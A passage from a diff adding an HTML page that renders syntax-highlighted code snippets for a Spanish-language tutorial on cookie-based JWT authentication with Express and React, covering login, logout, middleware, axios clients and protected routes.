+  [[PL,'      '],[KW,'return'],[PL,' res.'],[FN,'status'],[PL,'(401).'],[FN,'json'],[PL,'({ error: '],[ST,"'Credenciales incorrectas'"],[PL,' });']],
+  [[PL,'    '],[KW,'const'],[PL,' token = jwt.'],[FN,'sign'],[PL,'(']],
+  [[PL,'      { id: u.id, rol: u.rol },']],
+  [[PL,'      process.env.JWT_SECRET,']],
+  [[PL,'      { expiresIn: '],[ST,"'8h'"],[PL,' }']],
+  [[PL,'    );']],
+  [[PL,'']],
+  [[PL,'    '],[CM,'// ← El token va en la cookie, NO en el JSON']],
+  [[PL,'    res.'],[FN,'cookie'],[PL,'('],[ST,"'token'"],[PL,', token, {']],
+  [[PL,'      httpOnly: '],[KW,'true'],[PL,','],[CM,'    ← JavaScript no puede leer esta cookie']],
+  [[PL,'      sameSite: '],[ST,"'strict'"],[PL,','],[CM,'  ← protección contra CSRF']],
+  [[PL,'      secure:   '],[KW,'false'],[PL,','],[CM,'   ← false en desarrollo (HTTP), true en producción (HTTPS)']],
+  [[PL,'      maxAge:   8 * 60 * 60 * 1000'],[CM,'  ← 8 horas en milisegundos']],
+  [[PL,'    });']],
+  [[PL,'']],
+  [[PL,'    res.'],[FN,'json'],[PL,'({']],
+  [[PL,'      mensaje: '],[ST,"'Login exitoso'"],[PL,',']],
+  [[PL,'      usuario: { id: u.id, usuario: u.usuario, rol: u.rol }']],
+  [[PL,'    });']],
+  [[PL,'  } '],[KW,'catch'],[PL,' (err) { res.'],[FN,'status'],[PL,'(500).'],[FN,'json'],[PL,'({ error: err.message }); }']],
+  [[PL,'};']],
+  [[PL,'']],
+  [[CM,'// ── POST /api/auth/logout — borra la cookie ─────────────────']],
+  [[KW,'export const'],[PL,' logout = (req, res) => {']],
+  [[PL,'  res.'],[FN,'clearCookie'],[PL,'('],[ST,"'token'"],[PL,', { httpOnly: '],[KW,'true'],[PL,', sameSite: '],[ST,"'strict'"],[PL,' });']],
+  [[PL,'  res.'],[FN,'json'],[PL,'({ mensaje: '],[ST,"'Sesión cerrada correctamente'"],[PL,' });']],
+  [[PL,'};']],
+],
+
+c_auth_routes:[
+  [[IM,'import'],[PL,' { Router }                   '],[IM,'from'],[PL,' '],[ST,"'express'"],[PL,';']],
+  [[IM,'import'],[PL,' { registro, login, logout } '],[IM,'from'],[PL,' '],[ST,"'../controllers/auth.controller.js'"],[PL,';']],
+  [[PL,'']],
+  [[KW,'const'],[PL,' router = '],[FN,'Router'],[PL,'();']],
+  [[PL,'router.'],[FN,'post'],[PL,'('],[ST,"'/registro'"],[PL,', registro);']],
+  [[PL,'router.'],[FN,'post'],[PL,'('],[ST,"'/login'"],[PL,'   , login);']],
+  [[PL,'router.'],[FN,'post'],[PL,'('],[ST,"'/logout'"],[PL,'  , logout);'],[CM,'  ← ruta nueva']],
+  [[KW,'export default'],[PL,' router;']],
+],
+
+c_middleware:[
+  [[IM,'import'],[PL,' jwt '],[IM,'from'],[PL,' '],[ST,"'jsonwebtoken'"],[PL,';']],
+  [[PL,'']],
+  [[KW,'export const'],[PL,' verificarToken = (req, res, next) => {']],
+  [[PL,'']],
+  [[PL,'  '],[CM,'// Lee el token de la cookie — cookie-parser ya la procesó']],
+  [[PL,'  '],[KW,'const'],[PL,' token = req.cookies?.token;']],
+  [[PL,'']],
+  [[PL,'  '],[KW,'if'],[PL,' (!token)']],
+  [[PL,'    '],[KW,'return'],[PL,' res.'],[FN,'status'],[PL,'(401).'],[FN,'json'],[PL,'({ error: '],[ST,"'No hay sesión activa'"],[PL,' });']],
+  [[PL,'']],
+  [[PL,'  '],[KW,'try'],[PL,' {']],
+  [[PL,'    '],[KW,'const'],[PL,' payload = jwt.'],[FN,'verify'],[PL,'(token, process.env.JWT_SECRET);']],
+  [[PL,'    req.usuario = payload;']],
+  [[FN,'    next'],[PL,'();']],
+  [[PL,'  } '],[KW,'catch'],[PL,' {']],
+  [[PL,'    res.'],[FN,'status'],[PL,'(401).'],[FN,'json'],[PL,'({ error: '],[ST,"'Sesión inválida o expirada'"],[PL,' });']],
+  [[PL,'  }']],
+  [[PL,'};']],
+],
+
+c_auth_api:[
+  [[IM,'import'],[PL,' axios '],[IM,'from'],[PL,' '],[ST,"'axios'"],[PL,';']],
+  [[PL,'']],
+  [[CM,'// withCredentials: true → el navegador envía la cookie en peticiones cross-origin']],
+  [[KW,'const'],[PL,' BASE = '],[ST,"'http://localhost:3000/api/auth'"],[PL,';']],
+  [[PL,'']],
+  [[KW,'export const'],[PL,' loginUsuario = '],[KW,'async'],[PL,' (usuario, password) => {']],
+  [[PL,'  '],[KW,'const'],[PL,' res = '],[KW,'await'],[PL,' axios.'],[FN,'post'],[PL,'(`${BASE}/login`, { usuario, password },']],
+  [[PL,'    { withCredentials: '],[KW,'true'],[PL,' });']],
+  [[PL,'  '],[KW,'return'],[PL,' res.data;'],[CM,'  ← { mensaje, usuario: { id, usuario, rol } }  — sin token']],
+  [[PL,'};']],
+  [[PL,'']],
+  [[KW,'export const'],[PL,' logoutUsuario = '],[KW,'async'],[PL,' () => {']],
+  [[PL,'  '],[KW,'await'],[PL,' axios.'],[FN,'post'],[PL,'(`${BASE}/logout`, {}, { withCredentials: '],[KW,'true'],[PL,' });']],
+  [[PL,'};']],
+  [[PL,'']],
+  [[KW,'export const'],[PL,' verificarSesion = '],[KW,'async'],[PL,' () => {']],
+  [[PL,'  '],[KW,'const'],[PL,' res = '],[KW,'await'],[PL,' axios.'],[FN,'get'],[PL,'(`${BASE}/me`, { withCredentials: '],[KW,'true'],[PL,' });']],
+  [[PL,'  '],[KW,'return'],[PL,' res.data;']],
+  [[PL,'};']],
+],
+
+c_personas_api:[
+  [[IM,'import'],[PL,' axios '],[IM,'from'],[PL,' '],[ST,"'axios'"],[PL,';']],
+  [[PL,'']],
+  [[CM,'// Instancia de axios con withCredentials activado globalmente']],
+  [[CM,'// Así todas las peticiones envían la cookie automáticamente']],
+  [[KW,'const'],[PL,' api = axios.'],[FN,'create'],[PL,'({']],
+  [[PL,'  baseURL:         '],[ST,"'http://localhost:3000/api'"],[PL,',']],
+  [[PL,'  withCredentials: '],[KW,'true'],[CM,'  ← enviar cookie en cada petición']],
+  [[PL,'});']],
+  [[PL,'']],
+  [[KW,'export const'],[PL,' getPersonas        = '],[KW,'async'],[PL,' ()        => (await api.'],[FN,'get'],[PL,'('],[ST,"'/personas'"],[PL,')).data;']],
+  [[KW,'export const'],[PL,' getPersonaById     = '],[KW,'async'],[PL,' (id)      => (await api.'],[FN,'get'],[PL,'(`/personas/${id}`)).data;']],
+  [[KW,'export const'],[PL,' crearPersona       = '],[KW,'async'],[PL,' (datos)   => (await api.'],[FN,'post'],[PL,'('],[ST,"'/personas'"],[PL,', datos)).data;']],
+  [[KW,'export const'],[PL,' actualizarPersona  = '],[KW,'async'],[PL,' (id,datos)=> (await api.'],[FN,'put'],[PL,'(`/personas/${id}`, datos)).data;']],
+  [[KW,'export const'],[PL,' eliminarPersona    = '],[KW,'async'],[PL,' (id)      => (await api.'],[FN,'delete'],[PL,'(`/personas/${id}`)).data;']],
+],
+
+c_auth_ctx:[
+  [[IM,'import'],[PL,' { createContext, useContext, useState, useEffect } '],[IM,'from'],[PL,' '],[ST,"'react'"],[PL,';']],
+  [[IM,'import'],[PL,' { useNavigate }  '],[IM,'from'],[PL,' '],[ST,"'react-router-dom'"],[PL,';']],
+  [[IM,'import'],[PL,' { loginUsuario, logoutUsuario, verificarSesion } '],[IM,'from'],[PL,' '],[ST,"'../api/auth.api'"],[PL,';']],
+  [[PL,'']],
+  [[KW,'const'],[PL,' AuthContext = '],[FN,'createContext'],[PL,'('],[KW,'null'],[PL,');']],
+  [[PL,'']],
+  [[KW,'export function'],[PL,' '],[FN,'AuthProvider'],[PL,'({ children }) {']],
+  [[PL,'  '],[KW,'const'],[PL,' [usuario,  setUsuario]  = '],[FN,'useState'],[PL,'('],[KW,'null'],[PL,');']],
+  [[PL,'  '],[KW,'const'],[PL,' [cargando, setCargando] = '],[FN,'useState'],[PL,'('],[KW,'true'],[PL,');']],
+  [[PL,'  '],[KW,'const'],[PL,' navigate = '],[FN,'useNavigate'],[PL,'();']],
+  [[PL,'']],
+  [[CM,'  // Al iniciar: verificar si la cookie del navegador sigue siendo válida']],
+  [[FN,'  useEffect'],[PL,'(() => {']],
+  [[PL,'    '],[FN,'verificarSesion'],[PL,'()']],
+  [[PL,'      .'],[FN,'then'],[PL,'(data  => '],[FN,'setUsuario'],[PL,'(data.usuario))']],
+  [[PL,'      .'],[KW,'catch'],[PL,'(()    => '],[FN,'setUsuario'],[PL,'('],[KW,'null'],[PL,'))']],
+  [[PL,'      .'],[FN,'finally'],[PL,'(()   => '],[FN,'setCargando'],[PL,'('],[KW,'false'],[PL,'));']],
+  [[PL,'  }, []);']],
+  [[PL,'']],
+  [[KW,'  async function'],[PL,' '],[FN,'login'],[PL,'(nombreUsuario, password) {']],
+  [[PL,'    '],[KW,'const'],[PL,' data = '],[KW,'await'],[PL,' '],[FN,'loginUsuario'],[PL,'(nombreUsuario, password);']],
+  [[PL,'    '],[CM,'// El navegador guarda la cookie automáticamente — no hacemos nada']],
+  [[PL,'    '],[FN,'setUsuario'],[PL,'(data.usuario);']],
+  [[PL,'    '],[FN,'navigate'],[PL,'('],[ST,"'/personas'"],[PL,');']],
+  [[PL,'  }']],
+  [[PL,'']],
+  [[KW,'  async function'],[PL,' '],[FN,'logout'],[PL,'() {']],
+  [[PL,'    '],[KW,'await'],[PL,' '],[FN,'logoutUsuario'],[PL,'();'],[CM,'  ← el servidor borra la cookie']],
+  [[PL,'    '],[FN,'setUsuario'],[PL,'('],[KW,'null'],[PL,');']],
+  [[PL,'    '],[FN,'navigate'],[PL,'('],[ST,"'/login'"],[PL,');']],
+  [[PL,'  }']],
+  [[PL,'']],
+  [[PL,'  '],[KW,'if'],[PL,' (cargando) '],[KW,'return'],[PL,' '],[KW,'null'],[PL,';']],
+  [[PL,'']],
+  [[PL,'  '],[KW,'return'],[PL,' (']],
+  [[PL,'    <AuthContext.Provider value={{ usuario, login, logout }}>']],
+  [[PL,'      {children}']],
+  [[PL,'    </AuthContext.Provider>']],
+  [[PL,'  );']],
+  [[PL,'}']],
+  [[PL,'']],
+  [[KW,'export const'],[PL,' useAuth = () => '],[FN,'useContext'],[PL,'(AuthContext);']],
+],
+
+c_me:[
+  [[CM,'// Agregar al final de auth.controller.js']],
+  [[CM,'// ── GET /api/auth/me — verifica la cookie y devuelve el usuario ──']],
+  [[KW,'export const'],[PL,' me = (req, res) => {']],
+  [[PL,'  '],[CM,'// El middleware verificarToken ya validó la cookie y guardó el payload en req.usuario']],
+  [[PL,'  res.'],[FN,'json'],[PL,'({ usuario: req.usuario });']],
+  [[PL,'};']],
+],
+
+c_auth_routes2:[
+  [[IM,'import'],[PL,' { Router }                        '],[IM,'from'],[PL,' '],[ST,"'express'"],[PL,';']],
+  [[IM,'import'],[PL,' { registro, login, logout, me } '],[IM,'from'],[PL,' '],[ST,"'../controllers/auth.controller.js'"],[PL,';']],
+  [[IM,'import'],[PL,' { verificarToken }               '],[IM,'from'],[PL,' '],[ST,"'../middlewares/auth.middleware.js'"],[PL,';']],
+  [[PL,'']],
+  [[KW,'const'],[PL,' router = '],[FN,'Router'],[PL,'();']],
+  [[PL,'router.'],[FN,'post'],[PL,'('],[ST,"'/registro'"],[PL,',            registro);']],
+  [[PL,'router.'],[FN,'post'],[PL,'('],[ST,"'/login'"],[PL,'   ,            login);']],
+  [[PL,'router.'],[FN,'post'],[PL,'('],[ST,"'/logout'"],[PL,'  ,            logout);']],
+  [[PL,'router.'],[FN,'get'],[PL,' ('],[ST,"'/me'"],[PL,'     , verificarToken, me);'],[CM,'  ← protegida con middleware']],
+  [[KW,'export default'],[PL,' router;']],
+],
+
+c_login_page:[
+  [[IM,'import'],[PL,' { useState } '],[IM,'from'],[PL,' '],[ST,"'react'"],[PL,';']],
+  [[IM,'import'],[PL,' { useAuth }  '],[IM,'from'],[PL,' '],[ST,"'../context/AuthContext'"],[PL,';']],
+  [[PL,'']],
+  [[KW,'function'],[PL,' '],[FN,'LoginPage'],[PL,'() {']],
+  [[PL,'  '],[KW,'const'],[PL,' [usuario,  setUsuario]  = '],[FN,'useState'],[PL,'('],[ST,"''"],[PL,');']],
+  [[PL,'  '],[KW,'const'],[PL,' [password, setPassword] = '],[FN,'useState'],[PL,'('],[ST,"''"],[PL,');']],
+  [[PL,'  '],[KW,'const'],[PL,' [error,    setError]    = '],[FN,'useState'],[PL,'('],[ST,"''"],[PL,');']],
+  [[PL,'  '],[KW,'const'],[PL,' [cargando, setCargando] = '],[FN,'useState'],[PL,'('],[KW,'false'],[PL,');']],
+  [[PL,'  '],[KW,'const'],[PL,' { login } = '],[FN,'useAuth'],[PL,'();']],
+  [[PL,'']],
+  [[KW,'  async function'],[PL,' '],[FN,'handleSubmit'],[PL,'(e) {']],
+  [[PL,'    e.'],[FN,'preventDefault'],[PL,'(); '],[FN,'setError'],[PL,'('],[ST,"''"],[PL,'); '],[FN,'setCargando'],[PL,'('],[KW,'true'],[PL,');']],
+  [[PL,'    '],[KW,'try'],[PL,'   { '],[KW,'await'],[PL,' '],[FN,'login'],[PL,'(usuario, password); }']],
+  [[PL,'    '],[KW,'catch'],[PL,' (err) { '],[FN,'setError'],[PL,'(err.response?.data?.error || '],[ST,"'Error al iniciar sesión'"],[PL,'); }']],
+  [[PL,'    '],[KW,'finally'],[PL,' { '],[FN,'setCargando'],[PL,'('],[KW,'false'],[PL,'); }']],
+  [[PL,'  }']],
+  [[PL,'']],
+  [[PL,'  '],[KW,'return'],[PL,' (']],
+  [[PL,'    <div className='],[ST,'"d-flex justify-content-center align-items-center"'],[PL,' style={{ minHeight: '],[ST,"'80vh'"],[PL,' }}>']],
+  [[PL,'      <div className='],[ST,'"card border-primary"'],[PL,' style={{ width: '],[ST,"'380px'"],[PL,' }}>']],
+  [[PL,'        <div className='],[ST,'"card-header bg-primary text-white text-center fw-bold fs-5"'],[PL,'>']],
+  [[PL,'          🖥️ Sistema Administrativo']],
+  [[PL,'        </div>']],
+  [[PL,'        <div className='],[ST,'"card-body p-4"'],[PL,'>']],
+  [[PL,'          {error && <div className='],[ST,'"alert alert-danger py-2"'],[PL,'>{error}</div>}']],
+  [[PL,'          <form onSubmit={handleSubmit}>']],
+  [[PL,'            <div className='],[ST,'"mb-3"'],[PL,'>']],
+  [[PL,'              <label className='],[ST,'"form-label fw-semibold"'],[PL,'>Usuario</label>']],
+  [[PL,'              <input className='],[ST,'"form-control"'],[PL,' value={usuario}']],
+  [[PL,'                onChange={e => '],[FN,'setUsuario'],[PL,'(e.target.value)} required />']],
+  [[PL,'            </div>']],
+  [[PL,'            <div className='],[ST,'"mb-4"'],[PL,'>']],
+  [[PL,'              <label className='],[ST,'"form-label fw-semibold"'],[PL,'>Contraseña</label>']],
+  [[PL,'              <input className='],[ST,'"form-control"'],[PL,' type='],[ST,'"password"'],[PL,' value={password}']],
+  [[PL,'                onChange={e => '],[FN,'setPassword'],[PL,'(e.target.value)} required />']],
+  [[PL,'            </div>']],
+  [[PL,'            <button type='],[ST,'"submit"'],[PL,' className='],[ST,'"btn btn-primary w-100"'],[PL,' disabled={cargando}>']],
+  [[PL,'              {cargando ? '],[ST,"'Iniciando sesión...'"],[PL,' : '],[ST,"'Iniciar sesión'"],[PL,'}']],
+  [[PL,'            </button>']],
+  [[PL,'          </form>']],
+  [[PL,'        </div>']],
+  [[PL,'      </div>']],
+  [[PL,'    </div>']],
+  [[PL,'  );']],
+  [[PL,'}']],
+  [[KW,'export default'],[PL,' LoginPage;']],
+],
+
+c_private_route:[
+  [[IM,'import'],[PL,' { Navigate } '],[IM,'from'],[PL,' '],[ST,"'react-router-dom'"],[PL,';']],
+  [[IM,'import'],[PL,' { useAuth }  '],[IM,'from'],[PL,' '],[ST,"'../context/AuthContext'"],[PL,';']],
+  [[PL,'']],
+  [[KW,'function'],[PL,' '],[FN,'PrivateRoute'],[PL,'({ children }) {']],
+  [[PL,'  '],[KW,'const'],[PL,' { usuario } = '],[FN,'useAuth'],[PL,'();']],
+  [[PL,'  '],[KW,'if'],[PL,' (!usuario) '],[KW,'return'],[PL,' <Navigate to='],[ST,"'/login'"],[PL,' replace />;']],
+  [[PL,'  '],[KW,'return'],[PL,' children;']],
+  [[PL,'}']],
+  [[KW,'export default'],[PL,' PrivateRoute;']],
+],
+
+c_navbar:[
+  [[IM,'import'],[PL,' { Link }    '],[IM,'from'],[PL,' '],[ST,"'react-router-dom'"],[PL,';']],
+  [[IM,'import'],[PL,' { useAuth } '],[IM,'from'],[PL,' '],[ST,"'../context/AuthContext'"],[PL,';']],
+  [[PL,'']],
+  [[KW,'function'],[PL,' '],[FN,'Navbar'],[PL,'() {']],
+  [[PL,'  '],[KW,'const'],[PL,' { usuario, logout } = '],[FN,'useAuth'],[PL,'();']],
+  [[PL,'  '],[KW,'return'],[PL,' (']],
+  [[PL,'    <nav className='],[ST,'"navbar navbar-dark bg-primary px-4 py-2"'],[PL,'>']],
+  [[PL,'      <Link to='],[ST,"'/personas'"],[PL,' className='],[ST,'"navbar-brand fw-bold fs-5 text-white text-decoration-none"'],[PL,'>']],
+  [[PL,'        🖥️ Sistema Administrativo']],
+  [[PL,'      </Link>']],
+  [[PL,'      {usuario && (']],
+  [[PL,'        <div className='],[ST,'"d-flex align-items-center gap-3"'],[PL,'>']],
+  [[PL,'          <span className='],[ST,'"text-white-50"'],[PL,' style={{ fontSize: '],[ST,"'13px'"],[PL,' }}>']],
+  [[PL,'            👤 {usuario.usuario}']],
+  [[PL,'            <span className='],[ST,'"badge bg-light text-primary ms-2"'],[PL,'>{usuario.rol}</span>']],
+  [[PL,'          </span>']],
+  [[PL,'          <button className='],[ST,'"btn btn-outline-light btn-sm"'],[PL,' onClick={logout}>']],
+  [[PL,'            Cerrar sesión']],
+  [[PL,'          </button>']],
+  [[PL,'        </div>']],
+  [[PL,'      )}']],
+  [[PL,'    </nav>']],
+  [[PL,'  );']],
+  [[PL,'}']],
+  [[KW,'export default'],[PL,' Navbar;']],
+],
+
+c_main:[
+  [[IM,'import'],[PL,' React            '],[IM,'from'],[PL,' '],[ST,"'react'"],[PL,';']],
+  [[IM,'import'],[PL,' ReactDOM         '],[IM,'from'],[PL,' '],[ST,"'react-dom/client'"],[PL,';']],
+  [[IM,'import'],[PL,' { BrowserRouter }'],[IM,'from'],[PL,' '],[ST,"'react-router-dom'"],[PL,';']],
+  [[IM,'import'],[PL,' { AuthProvider } '],[IM,'from'],[PL,' '],[ST,"'./context/AuthContext'"],[PL,';']],
+  [[IM,'import'],[PL,' '],[ST,"'bootstrap/dist/css/bootstrap.min.css'"],[PL,';']],
+  [[IM,'import'],[PL,' App              '],[IM,'from'],[PL,' '],[ST,"'./App.jsx'"],[PL,';']],
+  [[PL,'']],
+  [[FN,'ReactDOM'],[PL,'.'],[FN,'createRoot'],[PL,'('],[FN,'document'],[PL,'.'],[FN,'getElementById'],[PL,'('],[ST,"'root'"],[PL,'))']],
+  [[PL,'  .'],[FN,'render'],[PL,'(']],
+  [[PL,'    <BrowserRouter>']],
+  [[PL,'      <AuthProvider>']],
+  [[PL,'        <App />']],
+  [[PL,'      </AuthProvider>']],
+  [[PL,'    </BrowserRouter>']],
+  [[PL,'  );']],
+],
+
+c_app:[
+  [[IM,'import'],[PL,' { Routes, Route } '],[IM,'from'],[PL,' '],[ST,"'react-router-dom'"],[PL,';']],
+  [[IM,'import'],[PL,' Navbar            '],[IM,'from'],[PL,' '],[ST,"'./components/Navbar'"],[PL,';']],
+  [[IM,'import'],[PL,' PrivateRoute      '],[IM,'from'],[PL,' '],[ST,"'./components/PrivateRoute'"],[PL,';']],
+  [[IM,'import'],[PL,' LoginPage         '],[IM,'from'],[PL,' '],[ST,"'./pages/LoginPage'"],[PL,';']],
+  [[IM,'import'],[PL,' PersonasPage      '],[IM,'from'],[PL,' '],[ST,"'./pages/PersonasPage'"],[PL,';']],
+  [[IM,'import'],[PL,' PersonaFormPage   '],[IM,'from'],[PL,' '],[ST,"'./pages/PersonaFormPage'"],[PL,';']],
+  [[PL,'']],
+  [[KW,'function'],[PL,' '],[FN,'App'],[PL,'() {']],
+  [[PL,'  '],[KW,'return'],[PL,' (']],
+  [[PL,'    <>']],
+  [[PL,'      <Navbar />']],
+  [[PL,'      <Routes>']],
+  [[PL,'        '],[CM,'{/* Pública */}']],
+  [[PL,'        <Route path='],[ST,"'/login'"],[PL,'             element={<LoginPage />} />']],
+  [[PL,'        '],[CM,'{/* Privadas — redirigen a /login sin sesión */}']],
+  [[PL,'        <Route path='],[ST,"'/'"],[PL,'                  element={<PrivateRoute><PersonasPage /></PrivateRoute>} />']],
+  [[PL,'        <Route path='],[ST,"'/personas'"],[PL,'           element={<PrivateRoute><PersonasPage /></PrivateRoute>} />']],
+  [[PL,'        <Route path='],[ST,"'/personas/nueva'"],[PL,'     element={<PrivateRoute><PersonaFormPage /></PrivateRoute>} />']],
+  [[PL,'        <Route path='],[ST,"'/personas/editar/:id'"],[PL,' element={<PrivateRoute><PersonaFormPage /></PrivateRoute>} />']],
+  [[PL,'      </Routes>']],
+  [[PL,'    </>']],
+  [[PL,'  );']],
+  [[PL,'}']],
+  [[KW,'export default'],[PL,' App;']],
+],
+
+};
+
+document.fonts.ready.then(()=>{
+  for(const [id,lines] of Object.entries(B)) draw(id,lines);
+});
+</script>
+</body>
+</html>
